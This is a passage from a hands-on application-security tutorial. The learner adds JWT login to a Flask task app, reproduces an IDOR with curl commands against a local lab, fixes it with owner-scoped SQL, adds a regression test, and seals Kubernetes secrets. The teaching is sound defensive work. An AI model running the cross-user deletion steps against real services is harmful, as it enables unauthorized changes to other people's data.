The main task board has no login form. After this task, the page at `http://localhost:8080/` still loads, but its API calls return 401. Use `http://localhost:8080/pentest` for the authenticated flows. Do not change `frontend/app.js` for this act.

<details>
<summary>Show solution</summary>

`database/init.sql`:

```sql
CREATE TABLE users (
    id integer GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    username varchar(32) NOT NULL UNIQUE,
    password_hash text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);

CREATE TABLE tasks (
    id integer GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    owner_id integer NOT NULL REFERENCES users (id),
    title varchar(120) NOT NULL,
    done boolean NOT NULL DEFAULT false,
    created_at timestamptz NOT NULL DEFAULT now()
);
```

`backend/app.py`, the imports and constants:

```python
import bcrypt
import jwt
from datetime import datetime, timedelta, timezone
from functools import wraps

JWT_ALGORITHM = "HS256"
TOKEN_LIFETIME = timedelta(hours=24)


def get_jwt_secret():
    return os.environ["JWT_SECRET"]
```

The auth decorator:

```python
def require_auth(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        header = request.headers.get("Authorization", "")
        if not header.startswith("Bearer "):
            return jsonify(error="Authentication required."), 401

        try:
            payload = jwt.decode(
                header.removeprefix("Bearer "), get_jwt_secret(), algorithms=[JWT_ALGORITHM]
            )
        except jwt.InvalidTokenError:
            return jsonify(error="Invalid or expired token."), 401

        g.user_id = int(payload["sub"])
        return view(*args, **kwargs)

    return wrapped
```

Registration:

```python
@app.post("/api/auth/register")
def register():
    data = request.get_json(silent=True)
    username = data.get("username") if isinstance(data, dict) else None
    password = data.get("password") if isinstance(data, dict) else None

    if not isinstance(username, str) or not 3 <= len(username) <= 32:
        return jsonify(error="Username must contain 3 to 32 characters."), 400
    if not isinstance(password, str) or len(password) < 8:
        return jsonify(error="Password must contain at least 8 characters."), 400

    password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

    try:
        with connect_to_database() as connection:
            user = connection.execute(
                "INSERT INTO users (username, password_hash) VALUES (%s, %s) RETURNING id, username",
                (username, password_hash),
            ).fetchone()
    except psycopg.errors.UniqueViolation:
        return jsonify(error="Username is already taken."), 409
    return jsonify(user), 201
```

Login:

```python
@app.post("/api/auth/login")
def login():
    data = request.get_json(silent=True)
    username = data.get("username") if isinstance(data, dict) else None
    password = data.get("password") if isinstance(data, dict) else None

    if not isinstance(username, str) or not isinstance(password, str):
        return jsonify(error="Username and password are required."), 400

    with connect_to_database() as connection:
        user = connection.execute(
            "SELECT id, password_hash FROM users WHERE username = %s", (username,)
        ).fetchone()

    if user is None or not bcrypt.checkpw(password.encode(), user["password_hash"].encode()):
        return jsonify(error="Invalid username or password."), 401

    expires_at = datetime.now(timezone.utc) + TOKEN_LIFETIME
    token = jwt.encode(
        {"sub": str(user["id"]), "exp": expires_at}, get_jwt_secret(), algorithm=JWT_ALGORITHM
    )
    return jsonify(token=token)
```

List, create, and search use `g.user_id`:

```python
@app.get("/api/tasks")
@require_auth
def list_tasks():
    with connect_to_database() as connection:
        tasks = connection.execute(
            "SELECT id, title, done FROM tasks WHERE owner_id = %s ORDER BY id DESC",
            (g.user_id,),
        ).fetchall()
    return jsonify(tasks)


@app.post("/api/tasks")
@require_auth
def create_task():
    data = request.get_json(silent=True)
    title = data.get("title") if isinstance(data, dict) else None

    if not isinstance(title, str) or not title.strip() or len(title.strip()) > 120:
        return jsonify(error="Title must contain 1 to 120 characters."), 400

    with connect_to_database() as connection:
        task = connection.execute(
            "INSERT INTO tasks (title, owner_id) VALUES (%s, %s) RETURNING id, title, done",
            (title.strip(), g.user_id),
        ).fetchone()
    return jsonify(task), 201


@app.get("/api/tasks/search")
@require_auth
def search_tasks():
    term = request.args.get("q", "")
    with connect_to_database() as connection:
        tasks = connection.execute(
            "SELECT id, title, done FROM tasks WHERE owner_id = %s AND title LIKE %s ORDER BY id DESC",
            (g.user_id, f"%{term}%"),
        ).fetchall()
    return jsonify(tasks)
```

Update and delete also require the token and filter by owner:

```python
@app.patch("/api/tasks/<int:task_id>")
@require_auth
def update_task(task_id):
    data = request.get_json(silent=True)
    done = data.get("done") if isinstance(data, dict) else None

    if not isinstance(done, bool):
        return jsonify(error="Done must be true or false."), 400

    with connect_to_database() as connection:
        task = connection.execute(
            "UPDATE tasks SET done = %s WHERE id = %s AND owner_id = %s RETURNING id, title, done",
            (done, task_id, g.user_id),
        ).fetchone()

    if task is None:
        return jsonify(error="Task not found."), 404
    return jsonify(task)


@app.delete("/api/tasks/<int:task_id>")
@require_auth
def delete_task(task_id):
    with connect_to_database() as connection:
        task = connection.execute(
            "DELETE FROM tasks WHERE id = %s AND owner_id = %s RETURNING id, title, done",
            (task_id, g.user_id),
        ).fetchone()

    if task is None:
        return jsonify(error="Task not found."), 404
    return jsonify(task)
```

Last resort: [open the solved backend/app.py](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/app.py)

</details>

#### Task 29: Reproduce the IDOR

Start the stack with `docker compose up --build`. Register two users, log in as both, create a task as Alice, and delete it as Bob. If port 8080 is in use, use 18080 in these commands.

<details>
<summary>Show solution</summary>

The blocks use bash. On Windows PowerShell 5.1, use `curl.exe`. Set variables with `$env:ALICE_TOKEN = ...`. Use `python` if `python3` is not on PATH.

```shell
docker compose up --build -d

curl -s -XPOST -H 'Content-Type: application/json' -d '{"username":"alice","password":"correct-horse-batt"}' localhost:8080/api/auth/register
curl -s -XPOST -H 'Content-Type: application/json' -d '{"username":"bob","password":"correct-horse-batt"}' localhost:8080/api/auth/register

ALICE_TOKEN=$(curl -s -XPOST -H 'Content-Type: application/json' -d '{"username":"alice","password":"correct-horse-batt"}' localhost:8080/api/auth/login | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
BOB_TOKEN=$(curl -s -XPOST -H 'Content-Type: application/json' -d '{"username":"bob","password":"correct-horse-batt"}' localhost:8080/api/auth/login | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

TASK=$(curl -s -XPOST -H "Authorization: Bearer $ALICE_TOKEN" -H 'Content-Type: application/json' -d '{"title":"Alice secret plan"}' localhost:8080/api/tasks)
TASK_ID=$(printf '%s' "$TASK" | python3 -c "import sys,json;print(json.load(sys.stdin)['id'])")

curl -s -o /dev/null -w "status=%{http_code}\n" -XDELETE -H "Authorization: Bearer $BOB_TOKEN" localhost:8080/api/tasks/$TASK_ID
```

Expected: `status=200`. Bob deleted Alice's task using only his own valid token. Use the task ID from the response. Do not assume the ID is 1.

Last resort: [open the solved backend/app.py](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/app.py)

</details>

#### Task 30: Fix the IDOR

Filter `UPDATE` and `DELETE` by `id = %s AND owner_id = %s`. Return `404` for a task that exists but belongs to someone else. Do not return `403`.

<details>
<summary>Show solution</summary>

```python
# PATCH before
"UPDATE tasks SET done = %s WHERE id = %s RETURNING id, title, done", (done, task_id)

# PATCH after
"UPDATE tasks SET done = %s WHERE id = %s AND owner_id = %s RETURNING id, title, done", (done, task_id, g.user_id)

# DELETE before
"DELETE FROM tasks WHERE id = %s RETURNING id, title, done", (task_id,)

# DELETE after
"DELETE FROM tasks WHERE id = %s AND owner_id = %s RETURNING id, title, done", (task_id, g.user_id)
```

Rebuild the backend and repeat the attack. Create a new task as Alice. Delete it as Bob. Expected: `status=404`. The task survives.

```shell
docker compose up --build -d backend
```

The starter `frontend/nginx.conf` already maps `/pentest` to `pentest.html` with `try_files $uri $uri.html $uri/ =404;`. Keep that line. Do not remove it.

A live, clickable version of the same attack and fix is at `http://localhost:8080/pentest`, served by the same frontend. It must be opened through `docker compose`, not a static-file previewer like VS Code's Live Server, which has no `/api/` proxy and returns `405` for the register and login requests.

Last resort: [open the solved backend/app.py](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/app.py)

</details>

#### Task 31: Write the regression test

Add the test imports, the token helper, the auth header helper, and a test that checks the SQL and its parameters.

<details>
<summary>Show solution</summary>

First update the two delete tests from Act 1, [Episode 4, Task 3](act1-software-engineer.md#task-3-add-two-tests), to send the auth header. `DELETE` now needs a logged-in user, so without the header both tests get a 401:

```python
def test_delete_task_returns_deleted_task(self):
    task = {"id": 7, "title": "Write tests", "done": False}

    with patch("app.connect_to_database", return_value=fake_database(task)):
        response = self.client.delete("/api/tasks/7", headers=auth_header(user_id=42))

    self.assertEqual(response.status_code, 200)
    self.assertEqual(response.json, task)

def test_delete_missing_task_returns_404(self):
    with patch("app.connect_to_database", return_value=fake_database(None)):
        response = self.client.delete("/api/tasks/999", headers=auth_header(user_id=42))

    self.assertEqual(response.status_code, 404)
```

Then add the imports and helpers:

```python
import os
from unittest.mock import MagicMock, patch

os.environ.setdefault("JWT_SECRET", "test-secret-at-least-32-bytes-long")

import jwt

from app import JWT_ALGORITHM, get_jwt_secret


def make_token(user_id):
    return jwt.encode({"sub": str(user_id)}, get_jwt_secret(), algorithm=JWT_ALGORITHM)


def auth_header(user_id):
    return {"Authorization": f"Bearer {make_token(user_id)}"}
```

```python
@patch("app.connect_to_database")
def test_delete_task_is_scoped_to_the_caller(self, mock_connect_to_database):
    mock_connection = MagicMock()
    mock_connection.execute.return_value.fetchone.return_value = None
    mock_connect_to_database.return_value.__enter__.return_value = mock_connection

    response = self.client.delete("/api/tasks/1", headers=auth_header(user_id=42))

    self.assertEqual(response.status_code, 404)
    sql, params = mock_connection.execute.call_args.args
    self.assertIn("owner_id", sql)
    self.assertEqual(params, (1, 42))
```

Last resort: [open the solved test_app.py](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/test_app.py)

</details>

### Common mistakes

| Symptom | Cause | Fix |
|---|---|---|
| Register or login returns `405` | Opened `/pentest` through a static-file previewer instead of `docker compose up` | Use `http://localhost:8080/pentest` with the Compose stack running |
| `DELETE`/`PATCH` still succeeds across users after the fix | The `WHERE` clause checks `id` but not `owner_id` | Add `AND owner_id = %s` to both queries |
| Fix returns `403` instead of `404` | Confirms a task's existence to a caller who does not own it | Return `404` for both "not yours" and "does not exist" |

## Encrypt secrets for Git (episode 25)

#### Task 32: Delete the hand-made database Secret

Delete the hand-made `app-db` Secret. If `app-auth` exists from an earlier run, delete it too. `--ignore-not-found` makes the command safe. Warning: the controller does not overwrite a Secret that it does not manage. The backend Pods fail until you apply the SealedSecrets.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- delete secret app-db app-auth -n app --ignore-not-found
```

Last resort: [open the solved 08-sealed-secrets.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/08-sealed-secrets.yaml)

</details>

#### Task 33: Install the controller

Install the Sealed Secrets controller and fetch its public certificate.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- apply -f kubernetes/sealed-secrets/controller.yaml
minikube kubectl -- -n kube-system rollout status deploy/sealed-secrets-controller

minikube kubectl -- get secret -n kube-system \
  -l sealedsecrets.bitnami.com/sealed-secrets-key \
  -o jsonpath='{.items[0].data.tls\.crt}' | base64 -d > kubernetes/sealed-secrets/pub-cert.pem
```

Last resort: [open the solved controller.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/sealed-secrets/controller.yaml)

</details>

#### Task 34: Seal app-db

Seal `app-db` with the username `tutorial` and a random password. Keep the username `tutorial` that Act 3 used for the hand-made Secret in [Task 9](act3-devops-engineer.md#task-9-create-the-namespace-and-the-database-secret). A different username creates a role that PostgreSQL does not have.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- create secret generic app-db -n app \
  --from-literal=username=tutorial --from-literal=password="$(openssl rand -hex 16)" \
  --dry-run=client -o yaml \
  | docker compose -f tools/compose.yaml run --rm -T kubeseal \
      --cert kubernetes/sealed-secrets/pub-cert.pem --format yaml \
  > kubernetes/app/08-sealed-secrets.yaml
```

Last resort: [open the solved 08-sealed-secrets.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/08-sealed-secrets.yaml)

</details>

#### Task 35: Seal app-auth

Seal `app-auth`, the JWT signing key.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- create secret generic app-auth -n app \
  --from-literal=jwt-secret="$(openssl rand -hex 32)" \
  --dry-run=client -o yaml \
  | docker compose -f tools/compose.yaml run --rm -T kubeseal \
      --cert kubernetes/sealed-secrets/pub-cert.pem --format yaml \
  >> kubernetes/app/08-sealed-secrets.yaml
```

Last resort: [open the solved 08-sealed-secrets.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/08-sealed-secrets.yaml)

</details>

#### Task 36: Apply and verify the SealedSecrets

Apply the SealedSecrets. Verify that the controller decrypts both into ordinary Secrets in `app`.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- apply -f kubernetes/app/08-sealed-secrets.yaml
minikube kubectl -- get secrets -n app
```

Expected: the controller decrypts both `SealedSecret` objects into ordinary Secrets in `app`. `kubernetes/app/08-sealed-secrets.yaml` is safe to commit. Only the cluster that generated the keypair can unseal it.

Last resort: [open the solved 08-sealed-secrets.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/08-sealed-secrets.yaml)

</details>

#### Task 37: Reset the PostgreSQL volume

The sealed `app-db` uses a new random password. The existing PostgreSQL volume still has the old password. Delete the volume so PostgreSQL initializes with the new password. Warning: this deletes the database data.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- scale statefulset postgres -n app --replicas=0
minikube kubectl -- delete pvc postgres-data-postgres-0 -n app
minikube kubectl -- scale statefulset postgres -n app --replicas=1
```

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 38: Wire JWT_SECRET and restart the backend

Wire `JWT_SECRET` into the backend Deployment from `app-auth`, the same way `DB_PASSWORD` already reads from `app-db`. Restart the backend Deployment so it reads the new Secret values.

<details>
<summary>Show solution</summary>

Add this to the backend container `env` in `kubernetes/app/04-deployments.yaml`:

```yaml
            - name: JWT_SECRET
              valueFrom:
                secretKeyRef:
                  name: app-auth
                  key: jwt-secret
```

Restart the Deployment:

```shell
minikube kubectl -- rollout restart deployment/backend -n app
minikube kubectl -- rollout status deployment/backend -n app
```

Commit `kubernetes/app/08-sealed-secrets.yaml`; ArgoCD's `app` Application already points at the whole folder.

Last resort: [open the solved 04-deployments.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/04-deployments.yaml)

</details>

### Common mistakes

| Symptom | Cause | Fix |
|---|---|---|
| `kubeseal` tries to reach the cluster | `--cert` was left off | Always pass `--cert kubernetes/sealed-secrets/pub-cert.pem` |
| Plaintext Secret committed by mistake | Confused the `--dry-run=client -o yaml` output with the sealed one | Check for `encryptedData`, not `data`, before `git add` |
| `SealedSecret` will not decrypt on a new cluster | Each cluster has its own keypair | Fetch a fresh `pub-cert.pem` and reseal for the new cluster |
| `SealedSecret` reports `already exists and is not managed by SealedSecret` | The hand-created Secret still exists | Delete the Secret, then apply the `SealedSecret` again |
| Backend cannot connect to PostgreSQL after sealing | The volume has the old password | Delete the PVC and restart PostgreSQL |

## Clean up

#### Task 39: Clean up

Remove the Compose stack and the Minikube cluster.

<details>
<summary>Show solution</summary>

```shell
docker compose down -v
minikube delete
```

The first command removes the Compose stack from Episode 24 and its database volume. The second command removes the Minikube cluster.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

## Act review

| | |
|---|---|
| Task | A search endpoint built SQL from user input, untested and unfixed, and no part of the app checked who was allowed to change what. |
| What you did | Found and exploited the SQL injection by hand and with `sqlmap`, fixed it with a parameterized query, added NetworkPolicies, checked the result with Semgrep, Trivy, and a ZAP baseline scan, added real users and reproduced and fixed an IDOR, then encrypted two secrets for Git with Sealed Secrets. |
| What you achieved | The app resists the injection, every workload has only the network access it needs, a Pod without an allow rule cannot reach the database, every future commit is checked by the same scans, one user can no longer touch another's data, and every secret this app needs is safe to commit. |
| What comes next | Episode 26: combine every act's skills ledger entries into one CV. |

**Resume after Act 4:** use the headline "Junior Cybersecurity Engineer (Penetration Testing and Application Security)". Add the Act 4 rows of the [skills ledger](../cv/skills-ledger.md) to your CV.
